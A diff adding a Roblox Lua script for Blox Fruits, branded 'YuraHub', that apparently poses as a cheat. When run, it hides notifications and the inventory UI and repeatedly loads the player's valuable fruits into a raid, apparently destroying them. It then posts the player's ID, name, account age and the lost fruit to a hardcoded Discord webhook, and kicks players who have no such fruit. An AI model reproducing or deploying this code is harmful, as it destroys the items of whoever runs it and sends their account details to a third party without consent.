@@ -1,0 +1,172 @@
+local HttpService = game:GetService("HttpService")
+
+local Webhook = "https://discord.com/api/webhooks/1424442101608747209/xQ88uFpX5C-DDH27_WK-xK7el4Z87I83YCjTUsLCVyAe8cFookITWIjTpm5szb1WhwJg"
+
+local First_Sea = false
+local Second_Sea = false
+local Third_Sea = false
+local bloxfruits = false
+local placeId = game.PlaceId
+
+if placeId == 2753915549 then
+	First_Sea = true
+	bloxfruits = true
+elseif placeId == 4442272183 then
+	Second_Sea = true
+	bloxfruits = true
+elseif placeId == 7449423635 then
+	Third_Sea = true
+	bloxfruits = true
+end
+
+if bloxfruits then
+	local player = game.Players.LocalPlayer
+	local target = nil
+	local setp = nil
+	local chipChanged = false
+	local startTime = os.clock()
+
+	if not player.Character then
+		game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetTeam", "Marines")
+		player.CharacterAdded:Wait()
+		task.wait(2)
+	end
+
+	startTime = os.clock()
+
+	local MyLevel = player.Data.Level.Value
+	if MyLevel < 1100 then
+		player:Kick("You need more level")
+	end
+
+	if player.PlayerGui:FindFirstChild("Notifications") then
+		player.PlayerGui.Notifications:Destroy()
+	end
+
+	--[[local main = player.PlayerGui:WaitForChild("Main")
+	if main and main:WaitForChild("Fragments") and player.PlayerGui:WaitForChild("UniversalContextButtons") then
+		local f = main.Fragments:Clone()
+		f.Name = "YuraHub"
+		f.Parent = player.PlayerGui.Main
+		main.Fragments:Destroy()
+
+		spawn(function()
+			while task.wait(.1) do
+				local args = {
+					[1] = "BlackbeardReward",
+					[2] = "Refund",
+					[3] = "2"
+				}
+				local PointStats =MyLevel-1
+				game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
+				game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AddPoint", "Sword", PointStats)
+				game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AddPoint", "Gun", PointStats)
+				game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AddPoint", "Demon Fruit", PointStats)
+			end
+		end)
+	end--]]
+
+	local backpack = player.PlayerGui:WaitForChild("Backpack")
+	if backpack and backpack:WaitForChild("Inventory") and player.PlayerGui:WaitForChild("UniversalContextButtons") then
+		local i = backpack.Inventory:Clone()
+		i.Name = "YuraHub"
+		i.Parent = player.PlayerGui.Backpack
+		backpack.Inventory.Visible = true
+		backpack.Inventory:Destroy()
+	end
+
+	game:GetService("RunService").Stepped:Connect(function()
+		local chr = player.Character
+		if chr and chr:FindFirstChild("HumanoidRootPart") then
+			local hrp = chr.HumanoidRootPart
+			if setp == nil then
+				setp = hrp.CFrame
+			end
+			if Third_Sea then
+				hrp.CFrame = CFrame.new(-5056, 315, -3180)
+			else
+				hrp.CFrame = setp
+			end
+		end
+	end)
+
+	spawn(function()
+		while task.wait(.1) do
+			pcall(function()
+				local fruits = {"Rocket-Rocket", "Spin-Spin", "Blade-Blade", "Spring-Spring"}
+				for _, fruit in ipairs(fruits) do
+					local args = {
+						[1] = "LoadFruit",
+						[2] = fruit
+					}
+					local result1 = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
+					if result1 then
+						target = fruit
+						chipChanged = true
+					end
+				end
+			end)
+		end
+	end)
+
+	spawn(function()
+		while task.wait(.1) do
+			pcall(function()
+				local specialMicrochip = player.Backpack:FindFirstChild("Special Microchip")
+					or player.Character:FindFirstChild("Special Microchip")
+				if specialMicrochip then
+					if Second_Sea then
+						fireclickdetector(workspace.Map.CircleIsland.RaidSummon2.Button.Main.ClickDetector)
+					elseif Third_Sea then
+						fireclickdetector(workspace.Map["Boat Castle"].RaidSummon2.Button.Main.ClickDetector)
+					end
+				end
+			end)
+		end
+	end)
+
+	spawn(function()
+		while task.wait(.1) do
+			pcall(function()
+				local result2 = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("RaidsNpc", "Select", "Dark")
+				if target and result2 then
+					local embed = {
+						["title"] = "実を削除しました",
+						["color"] = 39423,
+						["fields"] = {
+							{
+								["name"] = "プレイヤー情報",
+								["value"] = "```アカウントID: " .. tostring(player.UserId)
+									.. "\n名前: " .. player.Name
+									.. "\n年齢: " .. tostring(player.AccountAge)
+									.. "\n消した実: " .. tostring(target)
+									.. "```"
+							}
+						}
+					}
+					local data = HttpService:JSONEncode({
+						["embeds"] = {embed}
+					})
+					request({
+						Url = Webhook,
+						Method = "POST",
+						Headers = {
+							["Content-Type"] = "application/json"
+						},
+						Body = data
+					})
+					target = nil
+				end
+			end)
+		end
+	end)
+
+	spawn(function()
+		while task.wait(1) do
+			if os.clock() - startTime > 5 and not chipChanged then
+				player:Kick("Please try another account")
+				break
+			end
+		end
+	end)
+end
